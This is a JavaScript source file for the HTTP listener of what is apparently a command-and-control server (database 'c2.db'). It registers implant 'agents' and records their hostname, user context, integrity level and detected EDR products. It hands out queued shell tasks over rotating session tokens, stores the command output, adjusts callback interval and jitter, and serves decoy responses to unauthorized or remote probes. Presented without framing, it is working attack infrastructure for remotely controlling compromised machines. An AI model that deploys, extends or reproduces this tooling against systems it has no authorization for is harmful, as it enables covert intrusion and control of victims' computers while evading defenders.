/* eslint-disable @typescript-eslint/no-var-requires */
const http = require('http')
const Database = require('better-sqlite3')
const { randomUUID, randomBytes } = require('crypto')

const db = new Database('c2.db')

function buildTaskEnvelope(task) {
  if (!task) return null
  const taskCmd = String(task.command || '').trim()
  const taskArgs = task.args ? String(task.args).trim() : ''
  const taskText = [taskCmd, taskArgs].filter((part) => part && part.length > 0).join(taskArgs ? ' ' : '')
  return {
    TaskID: String(task.id || randomUUID()),
    TaskCMD: taskCmd,
    TaskArgument: taskArgs,
    TaskText: taskText,
  }
}

const gTaskCache = global
const dispatchedTaskCache = gTaskCache.__httpDispatchedTaskCache || new Map()
gTaskCache.__httpDispatchedTaskCache = dispatchedTaskCache

function rememberDispatchedTasks(agentId, envelopes) {
  if (!envelopes || !envelopes.length) return
  for (const env of envelopes) {
    if (!env || !env.TaskID) continue
    dispatchedTaskCache.set(env.TaskID, {
      agentId,
      command: env.TaskCMD || '',
      commandArgs: env.TaskArgument || '',
      taskText: env.TaskText || '',
    })
  }
}

function resolveDispatchedTask(taskId) {
  if (!taskId) return null
  const info = dispatchedTaskCache.get(taskId)
  if (info) {
    dispatchedTaskCache.delete(taskId)
    return info
  }
  return null
}

function collectQueuedTasks(agentId) {
  const stmt = db.prepare('SELECT * FROM queued_tasks WHERE agent_id = ? ORDER BY enqueued_at ASC')
  const rows = stmt.all(agentId)
  if (!rows || rows.length === 0) return null
  const envelopes = rows.map((task) => buildTaskEnvelope(task))
  const firstTask = envelopes[0]?.TaskText || (
    rows[0]?.command ? `${rows[0].command}${rows[0].args ? ' ' + rows[0].args : ''}`.trim() : ''
  )
  return { rows, envelopes, firstTaskText: firstTask }
}

function deleteQueuedTasks(ids = []) {
  if (!ids || ids.length === 0) return
  const placeholders = ids.map(() => '?').join(', ')
  db.prepare(`DELETE FROM queued_tasks WHERE id IN (${placeholders})`).run(...ids)
}

function normalizeResultEntries(body) {
  const entries = []
  const multi = body?.TaskResults || body?.task_results || body?.taskResults
  if (Array.isArray(multi)) {
    for (const item of multi) {
      if (!item) continue
      const raw =
        item.TaskResult ??
        item.task_result ??
        item.result ??
        item.Result ??
        item.value
      if (raw === undefined || raw === null) continue
      const taskIdValue = item.TaskID ?? item.task_id ?? item.taskId ?? ''
      const taskId =
        typeof taskIdValue === 'string'
          ? taskIdValue.trim()
          : String(taskIdValue ?? '').trim()
      entries.push({
        taskId,
        rawResult: typeof raw === 'string' ? raw : String(raw),
        commandOverride: item.TaskCMD ?? item.command ?? null,
        argsOverride: item.TaskArgument ?? item.args ?? item.arguments ?? null,
        textOverride: item.TaskText ?? item.task_text ?? item.task ?? null,
      })
    }
  }
  if (entries.length === 0) {
    const singleRaw =
      body?.TaskResult ?? body?.task_result ?? body?.result ?? body?.Result
    if (singleRaw !== undefined && singleRaw !== null) {
      const taskIdValue = body?.TaskID ?? body?.task_id ?? body?.taskId ?? ''
      const taskId =
        typeof taskIdValue === 'string'
          ? taskIdValue.trim()
          : String(taskIdValue ?? '').trim()
      entries.push({
        taskId,
        rawResult: typeof singleRaw === 'string' ? singleRaw : String(singleRaw),
        commandOverride: body?.TaskCMD ?? body?.command ?? null,
        argsOverride: body?.TaskArgument ?? body?.args ?? null,
        textOverride: body?.TaskText ?? body?.task ?? null,
      })
    }
  }
  return entries
}

function deriveCommandContext(baseText, taskId, overrides = {}) {
  const cached = taskId ? resolveDispatchedTask(taskId) : null
  const trimmedBase = (baseText || '').trim()
  const parts = trimmedBase.length ? trimmedBase.split(/\s+/) : []
  const fallbackCmd = parts.shift() || ''
  const fallbackArgs = parts.join(' ')
  const cmd = ((overrides.cmd ?? cached?.command ?? fallbackCmd) || '').trim()
  const args =
    overrides.args ??
    cached?.commandArgs ??
    (cmd ? fallbackArgs : '')
  const descriptor =
    overrides.text ??
    cached?.taskText ??
    (cmd ? `${cmd}${args ? ' ' + args : ''}` : trimmedBase)
  return { cmd, args, descriptor }
}

function deriveAgentConfigUpdate(cmd = '', args = '') {
  const base = String(cmd || '').trim().toLowerCase()
  if (base !== 'set') return null
  const parts = String(args || '').trim().split(/\s+/).filter(Boolean)
  if (parts.length < 2) return null
  const key = parts[0].toLowerCase()
  const valNum = Number(parts[1])
  if (!Number.isFinite(valNum) || valNum <= 0) return null
  if (key === 'cb' || key === 'callback' || key === 'interval') {
    return { callback_interval: valNum }
  }
  if (key === 'jitter' || key === 'jit' || key === 'j') {
    return { jitter_value: valNum }
  }
  return null
}

const updateCallbackStmt = db.prepare('UPDATE agents SET callback_interval = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?')
const updateJitterStmt = db.prepare('UPDATE agents SET jitter_value = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?')

function applyAgentConfigUpdate(agentId, update = {}) {
  if (!agentId || !update) return false
  let changed = false
  try {
    if (update.callback_interval !== undefined) {
      updateCallbackStmt.run(update.callback_interval, agentId)
      changed = true
    }
    if (update.jitter_value !== undefined) {
      updateJitterStmt.run(update.jitter_value, agentId)
      changed = true
    }
  } catch {}
  return changed
}

const upsertCommandStmt = db.prepare(`
  INSERT INTO commands (id, agent_id, command, command_args, command_result, success, error, time_tasked, time_completed)
  VALUES (@id, @agent_id, @command, @command_args, @command_result, @success, @error, @time_tasked, @time_completed)
  ON CONFLICT(id) DO UPDATE SET
    command = COALESCE(NULLIF(excluded.command, ''), commands.command),
    command_args = COALESCE(excluded.command_args, commands.command_args),
    command_result = excluded.command_result,
    success = excluded.success,
    error = excluded.error,
    time_tasked = COALESCE(commands.time_tasked, excluded.time_tasked),
    time_completed = excluded.time_completed
`)

function persistCommandResult(record) {
  upsertCommandStmt.run(record)
}

function updateActivity(id, success = true) {
  const stmt = db.prepare(
    `UPDATE listeners SET last_activity = ?, requests_count = COALESCE(requests_count,0) + 1, updated_at = CURRENT_TIMESTAMP ${
      success ? '' : ', errors_count = COALESCE(errors_count,0) + 1'
    } WHERE id = ?`
  )
  stmt.run(Date.now(), id)
}

function updateOpsecConfig(listenerId, updateFn) {
  try {
    const row = db.prepare('SELECT config FROM listeners WHERE id = ?').get(listenerId)
    let cfg = {}
    try { cfg = JSON.parse(row?.config || '{}') } catch {}
    updateFn(cfg)
    db.prepare('UPDATE listeners SET config = ? WHERE id = ?').run(JSON.stringify(cfg), listenerId)
  } catch {}
}

async function startHttpListener({ id, host = '0.0.0.0', port, name, config = {}, agentKey = '' }) {
  const httpCfg = config.http || {}
  const successStatus = httpCfg.success_status ?? 204
  const decoyStatus = httpCfg.decoy_status ?? 200
  const decoyBody = httpCfg.decoy_body ?? '{"status":"ok"}'
  const getEndpoints = Array.isArray(httpCfg.get_endpoints) ? httpCfg.get_endpoints : ["/"]
  const postEndpoints = Array.isArray(httpCfg.post_endpoints) ? httpCfg.post_endpoints : ["/"]
  const pollPath = getEndpoints[0] || '/'
  const checkInPath = postEndpoints[0] || '/'

  const server = http.createServer((req, res) => {
    const url = req.url || '/'
    const urlObj = (() => { try { return new URL(url, 'http://localhost') } catch { return { pathname: url } } })()
    const remote = req.socket && req.socket.remoteAddress ? req.socket.remoteAddress : 'unknown'
    let body = ''
    req.on('data', (chunk) => (body += chunk))
    req.on('end', () => {
      try {
        let bodyKey = ''
        try {
          const parsed = JSON.parse(body || '{}')
          bodyKey = String(parsed.agent_key || parsed.key || '')
        } catch {}
        const presentedKey = bodyKey
        const okAuth = agentKey ? presentedKey === agentKey : !!presentedKey
        const probeHeader = String(req.headers['probe'] || '').toLowerCase()
        const probeKeyHeader = String(req.headers['key'] || '')
        const remoteIsLocal = remote === '127.0.0.1' || remote === '::1' || remote === '::ffff:127.0.0.1'
        const probeAuthorized = !!probeHeader && remoteIsLocal && probeKeyHeader === agentKey
        if (!!probeHeader && !remoteIsLocal) {
          updateActivity(id, false)
          updateOpsecConfig(id, (cfg) => {
            cfg.opsec = cfg.opsec || {}
            cfg.opsec.remote_probe_attempts = (cfg.opsec.remote_probe_attempts || 0) + 1
            cfg.opsec.last_remote_probe = { time: Date.now(), remote }
          })
          res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
          res.end(decoyBody)
          console.log(`[http ${name}] ${req.method} ${urlObj.pathname || url} from ${remote} -> ${decoyStatus} (remote PROBE blocked)`)          
          return
        }

        if (req.method === 'GET') {
          const path = urlObj.pathname || url
          if (path === pollPath) {
            // Polling requires a valid session token
            //let sessionToken = String((req.headers['if-none-match'] || '')).replace(/^"|"$/g, '')
            let sessionToken = String(
              (
                req.headers['session'] ||
                req.headers['session-key'] ||
                req.headers['etag'] ||
                req.headers['x-request-id']
              )
            ).replace(/^"|"$/g, '')
            if (!sessionToken) {
              try {
                const parsed = JSON.parse(body || '{}')
                sessionToken = String(parsed.session_token || parsed.token || '')
              } catch {}
            }
            if (probeAuthorized) {
              updateActivity(id, true)
              res.writeHead(successStatus, { 'Content-Type': 'application/json' })
              res.end(JSON.stringify({ session_token: randomBytes(32).toString('hex'), agent_id: 'probe' }))
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${successStatus} (probe authorized)`)          
              return
            }
            if (!sessionToken) {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${decoyStatus} (missing session token)`)          
              return
            }

            const sess = db.prepare('SELECT * FROM sessions WHERE session_key = ? AND is_active = 1').get(sessionToken)
            if (!sess) {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${decoyStatus} (invalid session)`)          
              return
            }

            const newToken = randomBytes(32).toString('hex')
            const nowIso = new Date().toISOString()
            db.prepare('UPDATE sessions SET session_key = ?, last_checkin = ?, is_active = 1 WHERE id = ?').run(newToken, nowIso, sess.id)
            // Pull queued tasks for this agent, if any
            const queuedBundle = collectQueuedTasks(sess.agent_id)
            let payload = { session_token: newToken, agent_id: sess.agent_id }
            if (queuedBundle) {
              rememberDispatchedTasks(sess.agent_id, queuedBundle.envelopes)
              try { broadcast('task:dispatched', { agent_id: sess.agent_id, tasks: queuedBundle.envelopes, time: nowIso }) } catch {}
              payload = {
                ...payload,
                Tasks: queuedBundle.envelopes,
                TaskCount: queuedBundle.envelopes.length,
              }
              try { deleteQueuedTasks(queuedBundle.rows.map((task) => task.id)) } catch {}
              try {
                db.prepare('UPDATE agents SET last_callback = ?, last_seen_timestamp = ?, last_queued_task = ?, current_running_task = ? WHERE id = ?')
                  .run(nowIso, Date.now(), queuedBundle.firstTaskText, queuedBundle.firstTaskText, sess.agent_id)
              } catch {}
            } else {
              try { db.prepare('UPDATE agents SET last_callback = ?, last_seen_timestamp = ? WHERE id = ?').run(nowIso, Date.now(), sess.agent_id) } catch {}
            }
            broadcast('agents:refresh', { id: sess.agent_id })

            updateActivity(id, true)
            res.writeHead(successStatus, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify(payload))
            console.log(
              `[http ${name}] GET ${path} from ${remote} -> ${successStatus} (session rotated${
                queuedBundle ? ` + ${queuedBundle.envelopes.length} task(s)` : ''
              })`,
            )
            return
          }
          if (getEndpoints.includes(path)) {
            if (okAuth) {
              updateActivity(id, true)
              res.writeHead(successStatus)
              res.end()
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${successStatus} (authorized)`)            
            } else {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] GET ${path} from ${remote} -> ${decoyStatus} (unauthorized/no-key)`)            
            }
          } else {
            updateActivity(id, false)
            res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
            res.end(decoyBody)
            console.log(`[http ${name}] GET ${path} from ${remote} -> ${decoyStatus} (no-match)`)          
          }
          return
        }
        if (req.method === 'POST') {
          const path = urlObj.pathname || url
          if (path === checkInPath) {
            // Distinguish results POST (session header + task_result) from first-time registration
            let parsed = {}
            try { parsed = JSON.parse(body || '{}') } catch {}
            //const sessionToken = String((req.headers['if-none-match'] || '')).replace(/^"|"$/g, '')
            let sessionToken = String(
              (
                req.headers['session'] ||
                req.headers['session-key'] ||
                req.headers['etag'] ||
                req.headers['x-request-id']
              )
              
            ).replace(/^"|"$/g, '')
            const resultEntries = normalizeResultEntries(parsed)
            const hasResult = resultEntries.length > 0
            if (hasResult && sessionToken) {
              const sess = db.prepare('SELECT * FROM sessions WHERE session_key = ? AND is_active = 1').get(sessionToken)
              if (!sess) {
                updateActivity(id, false)
                res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
                res.end(decoyBody)
                console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (invalid session for result)`)            
                return
              }
              const agent = db.prepare('SELECT * FROM agents WHERE id = ?').get(sess.agent_id)
              const nowIso = new Date().toISOString()
              const historyEntries = []
              let lastErrorTask = ''
              let lastError = ''
              let agentConfigChanged = false

              for (const entry of resultEntries) {
                const baseTask = String(agent?.last_queued_task || '').trim()
                const { cmd, args, descriptor } = deriveCommandContext(baseTask, entry.taskId, {
                  cmd: entry.commandOverride,
                  args: entry.argsOverride,
                  text: entry.textOverride,
                })
                const trimmed = entry.rawResult.trim()
                const lower = trimmed.toLowerCase()
                const isBool = lower === 'true' || lower === 'false'
                const success = isBool ? lower === 'true' : true
                const command_result = isBool ? '' : entry.rawResult
                const error = success ? '' : (command_result || 'Command failed')
                if (!success) {
                  lastErrorTask = descriptor || baseTask || cmd
                  lastError = error
                }
                const cmdId = entry.taskId || randomUUID()
                const resultRecord = {
                  id: cmdId,
                  agent_id: sess.agent_id,
                  command: cmd,
                  command_args: args,
                  command_result,
                  success: success ? 1 : 0,
                  error,
                  time_tasked: nowIso,
                  time_completed: nowIso,
                }
                persistCommandResult(resultRecord)
                broadcast('command:result', { id: cmdId, agent_id: sess.agent_id, command: cmd, command_args: args, command_result, success, error, time_tasked: nowIso, time_completed: nowIso })

                historyEntries.push(
                  `${new Date().toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'})}\nAgent returned ${descriptor || cmd || 'task'} results:\n${command_result || (success ? 'OK' : error)}\n\n`,
                )

                if (success) {
                  const cfgUpdate = deriveAgentConfigUpdate(cmd, args)
                  if (cfgUpdate && applyAgentConfigUpdate(sess.agent_id, cfgUpdate)) {
                    agentConfigChanged = true
                  }
                }
              }

              if (historyEntries.length) {
                const combinedHistory = `${agent?.terminal_history || ''}${historyEntries.join('')}`
                try {
                  db.prepare('UPDATE agents SET terminal_history = ?, current_running_task = "", last_error_task = ?, last_error = ?, last_callback = ?, last_seen_timestamp = ? WHERE id = ?')
                    .run(combinedHistory, lastErrorTask, lastError, nowIso, Date.now(), sess.agent_id)
                } catch {}
              }
              if (agentConfigChanged) {
                try { broadcast('agents:refresh', { id: sess.agent_id }) } catch {}
              }
              // Rotate session and possibly deliver next task
              const newToken = randomBytes(32).toString('hex')
              db.prepare('UPDATE sessions SET session_key = ?, last_checkin = ?, is_active = 1 WHERE id = ?').run(newToken, new Date().toISOString(), sess.id)
              const queuedBundle = collectQueuedTasks(sess.agent_id)
              let payload = { session_token: newToken, agent_id: sess.agent_id }
              if (queuedBundle) {
                rememberDispatchedTasks(sess.agent_id, queuedBundle.envelopes)
                try { broadcast('task:dispatched', { agent_id: sess.agent_id, tasks: queuedBundle.envelopes, time: nowIso }) } catch {}
                payload = {
                  ...payload,
                  Tasks: queuedBundle.envelopes,
                  TaskCount: queuedBundle.envelopes.length,
                }
                try { deleteQueuedTasks(queuedBundle.rows.map((task) => task.id)) } catch {}
                try { db.prepare('UPDATE agents SET last_queued_task = ?, current_running_task = ? WHERE id = ?').run(queuedBundle.firstTaskText, queuedBundle.firstTaskText, sess.agent_id) } catch {}
              }
              updateActivity(id, true)
              res.writeHead(successStatus, { 'Content-Type': 'application/json' })
              res.end(JSON.stringify(payload))
              console.log(
                `[http ${name}] POST ${path} from ${remote} -> ${successStatus} (result accepted${
                  queuedBundle ? ` + ${queuedBundle.envelopes.length} task(s)` : ''
                })`,
              )
              return
            }

            // First-time check-in: validate agent key in body and create agent + session
            const incomingKey = String(parsed.agent_key || parsed.key || '')
            if (probeAuthorized || (parsed.probe === true && remoteIsLocal && incomingKey === agentKey)) {
              updateActivity(id, true)
              res.writeHead(successStatus, { 'Content-Type': 'application/json' })
              res.end(JSON.stringify({ probe: true }))
              console.log(`[http ${name}] POST ${path} from ${remote} -> ${successStatus} (probe authorized)`)            
              return
            }
            // Actually compare to listener's base agent key
            const listenerRow = db.prepare('SELECT base_agent_key, base_agent_name FROM listeners WHERE id = ?').get(id)
            const keyMatch = listenerRow && listenerRow.base_agent_key && (incomingKey === listenerRow.base_agent_key)
            if (!keyMatch) {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (invalid agent key)`)            
              return
            }

            const nowIso = new Date().toISOString()
            const aid = randomUUID()
            const hostname = String(parsed.hostname || 'unknown')
            const ipArr = Array.isArray(parsed.ip_addr) ? parsed.ip_addr : (parsed.ip_addr ? [String(parsed.ip_addr)] : [])
            const edr = Array.isArray(parsed.edr) ? parsed.edr : (parsed.edr ? [String(parsed.edr)] : [])
            const edrJson = JSON.stringify(edr)
            const os = String(parsed.os || 'unknown')
            const build = parsed.build ? String(parsed.build) : null
            const cbInterval = Number(parsed.callback_interval || parsed.interval || 60)
            const pid = Number(parsed.pid || 0)
            const userCtx = String(parsed.user || parsed.user_context || '')
            const cwd = String(parsed.cwd || '/')
            const defShell = String(parsed.default_shell || 'bash')
            const integrity = String(parsed.IntegrityLevel || 'user')
            const baseAgent = listenerRow.base_agent_name || name

            const insert = db.prepare(`
              INSERT INTO agents (
                id, hostname, ip_addr, os, build, last_callback, created_time,
                callback_interval, jitter_value, jitter_translate, pid, user_context,
                base_agent, terminal_history, loaded_commands, cwd, last_queued_task,
                current_running_task, last_error_task, listener, work_hours, kill_date,
                edr, target_domain, last_error, default_shell, integrity_level,
                status, last_seen_timestamp
              ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            `)
            insert.run(
              aid,
              hostname,
              JSON.stringify(ipArr),
              os,
              build,
              nowIso,
              nowIso,
              cbInterval,
              15,
              0,
              pid,
              userCtx,
              baseAgent,
              '',
              '[]',
              cwd,
              '',
              '',
              '',
              name,
              '24/7',
              null,
              edrJson,
              '',
              '',
              defShell,
              integrity,
              'online',
              Date.now()
            )

            const sid = randomUUID()
            const token = randomBytes(32).toString('hex')
            db.prepare('INSERT INTO sessions (id, agent_id, listener_id, session_key, last_checkin, is_active) VALUES (?, ?, ?, ?, ?, 1)')
              .run(sid, aid, id, token, nowIso)

            updateActivity(id, true)
            res.writeHead(successStatus, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({ session_token: token, agent_id: aid, interval: cbInterval }))
            console.log(`[http ${name}] POST ${path} from ${remote} -> ${successStatus} (check-in ok)`)              
            broadcast('agents:refresh', { id: aid })
            return
          }
          if (postEndpoints.includes(path)) {
            // Results post: identify via session header rather than agent key
            let parsed = {}
            try { parsed = JSON.parse(body || '{}') } catch {}
            const sessionToken = String((req.headers['if-none-match'] || '')).replace(/^"|"$/g, '')
            const resultEntries = normalizeResultEntries(parsed)
            if (resultEntries.length && sessionToken) {
              const sess = db.prepare('SELECT * FROM sessions WHERE session_key = ? AND is_active = 1').get(sessionToken)
              if (!sess) {
                updateActivity(id, false)
                res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
                res.end(decoyBody)
                console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (invalid session for result)`)            
                return
              }
              const agent = db.prepare('SELECT * FROM agents WHERE id = ?').get(sess.agent_id)
              const nowIso = new Date().toISOString()
              const historyEntries = []
              let lastErrorTask = ''
              let lastError = ''
              let agentConfigChanged = false

              for (const entry of resultEntries) {
                const baseTask = String(agent?.last_queued_task || '').trim()
                const { cmd, args, descriptor } = deriveCommandContext(baseTask, entry.taskId, {
                  cmd: entry.commandOverride,
                  args: entry.argsOverride,
                  text: entry.textOverride,
                })
                const trimmed = entry.rawResult.trim()
                const lower = trimmed.toLowerCase()
                const isBool = lower === 'true' || lower === 'false'
                const success = isBool ? lower === 'true' : true
                const command_result = isBool ? '' : entry.rawResult
                const error = success ? '' : (command_result || 'Command failed')
                if (!success) {
                  lastErrorTask = descriptor || baseTask || cmd
                  lastError = error
                }
                const cmdId = entry.taskId || randomUUID()
                const resultRecord = {
                  id: cmdId,
                  agent_id: sess.agent_id,
                  command: cmd,
                  command_args: args,
                  command_result,
                  success: success ? 1 : 0,
                  error,
                  time_tasked: nowIso,
                  time_completed: nowIso,
                }
                persistCommandResult(resultRecord)
                broadcast('command:result', { id: cmdId, agent_id: sess.agent_id, command: cmd, command_args: args, command_result, success, error, time_tasked: nowIso, time_completed: nowIso })
                historyEntries.push(
                  `${new Date().toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'})}\nAgent returned ${descriptor || cmd || 'task'} results:\n${command_result || (success ? 'OK' : error)}\n\n`,
                )

                if (success) {
                  const cfgUpdate = deriveAgentConfigUpdate(cmd, args)
                  if (cfgUpdate && applyAgentConfigUpdate(sess.agent_id, cfgUpdate)) {
                    agentConfigChanged = true
                  }
                }
              }

              if (historyEntries.length) {
                const combinedHistory = `${agent?.terminal_history || ''}${historyEntries.join('')}`
                try {
                  db.prepare('UPDATE agents SET terminal_history = ?, current_running_task = "", last_error_task = ?, last_error = ?, last_callback = ?, last_seen_timestamp = ? WHERE id = ?')
                    .run(combinedHistory, lastErrorTask, lastError, nowIso, Date.now(), sess.agent_id)
                } catch {}
              }
              if (agentConfigChanged) {
                try { broadcast('agents:refresh', { id: sess.agent_id }) } catch {}
              }
              // Rotate session and optionally deliver next task
              const newToken = randomBytes(32).toString('hex')
              db.prepare('UPDATE sessions SET session_key = ?, last_checkin = ?, is_active = 1 WHERE id = ?').run(newToken, new Date().toISOString(), sess.id)
              const queuedBundle = collectQueuedTasks(sess.agent_id)
              let payload = { session_token: newToken, agent_id: sess.agent_id }
              if (queuedBundle) {
                rememberDispatchedTasks(sess.agent_id, queuedBundle.envelopes)
                try { broadcast('task:dispatched', { agent_id: sess.agent_id, tasks: queuedBundle.envelopes, time: nowIso }) } catch {}
                payload = {
                  ...payload,
                  Tasks: queuedBundle.envelopes,
                  TaskCount: queuedBundle.envelopes.length,
                }
                try { deleteQueuedTasks(queuedBundle.rows.map((task) => task.id)) } catch {}
                try { db.prepare('UPDATE agents SET last_queued_task = ?, current_running_task = ? WHERE id = ?').run(queuedBundle.firstTaskText, queuedBundle.firstTaskText, sess.agent_id) } catch {}
              }
              updateActivity(id, true)
              res.writeHead(successStatus, { 'Content-Type': 'application/json' })
              res.end(JSON.stringify(payload))
              console.log(
                `[http ${name}] POST ${path} from ${remote} -> ${successStatus} (result accepted${
                  queuedBundle ? ` + ${queuedBundle.envelopes.length} task(s)` : ''
                })`,
              )
              return
            }
            // Fallback: body-key auth endpoints (legacy)
            if (okAuth) {
              updateActivity(id, true)
              res.writeHead(successStatus)
              res.end()
              console.log(`[http ${name}] POST ${path} from ${remote} -> ${successStatus} (authorized)`)              
            } else {
              updateActivity(id, false)
              res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
              res.end(decoyBody)
              console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (unauthorized/no-key)`)            
            }
          } else {
            updateActivity(id, false)
            res.writeHead(decoyStatus, { 'Content-Type': 'application/json' })
            res.end(decoyBody)
            console.log(`[http ${name}] POST ${path} from ${remote} -> ${decoyStatus} (no-match)`)            
          }
          return
        }
        updateActivity(id, false)
        res.writeHead(404)
        res.end()
      } catch (e) {
        try {
          console.error(`[http ${name}] error handling ${req.method} ${req.url}:`, e && e.stack ? e.stack : e)
        } catch {}
        updateActivity(id, false)
        res.writeHead(500, { 'Content-Type': 'application/json' })
        try { res.end(JSON.stringify({ ok: false, error: (e && e.message) ? e.message : 'internal_error' })) } catch { res.end() }
      }
    })
  })

  await new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, host, () => resolve(null))
  })

  console.log(`[http-listener] ${name} listening on http://${host}:${port}`)
  server.on('close', () => {
    console.log(`[http-listener] ${name} closed on http://${host}:${port}`)
  })
  return server
}
  async function broadcast(type, payload) {
    try {
      const data = JSON.stringify({ type, payload })
      const req = http.request({ hostname: '127.0.0.1', port: 3000, path: '/api/events', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } })
      req.on('error', () => {})
      req.write(data)
      req.end()
    } catch {}
  }

module.exports = { startHttpListener }
